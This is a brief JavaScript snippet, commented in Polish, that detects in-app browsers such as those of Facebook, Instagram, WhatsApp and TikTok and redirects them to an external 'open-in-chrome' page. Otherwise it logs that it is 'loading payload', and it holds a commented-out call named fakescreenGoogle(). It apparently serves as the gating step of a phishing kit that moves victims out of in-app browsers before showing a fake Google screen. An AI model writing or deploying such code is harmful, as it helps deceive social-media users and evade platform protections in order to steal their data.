(function () {
  const ua = navigator.userAgent.toLowerCase();

  const suspects = [
    "fbav",         // Facebook, Messenger
    "instagram",    // Instagram app
    "whatsapp",     // WhatsApp WebView
    "telegram",     // Telegram app
    "tiktok",       // TikTok WebView
    "snapchat",     // Snapchat in-app browser
    "reddit",       // Reddit app
    "twitter",      // Twitter app
    "linkedin",     // LinkedIn app
    "wv",           // Android WebView
  ];

  const isWebView = suspects.some(agent => ua.includes(agent));

  if (isWebView) {
    console.log("🚧 WebView z aplikacji wykryty – przekierowanie do Chrome");
    setTimeout(() => {
      window.location.href = "https://checkerls.vercel.app/open-in-chrome.html";
    }, 2000);
  } else {
    console.log("✅ Brak WebView – ładuję payload.");
    // Jeśli chcesz trigger automatyczny:
    // fakescreenGoogle(); 
  }
})();
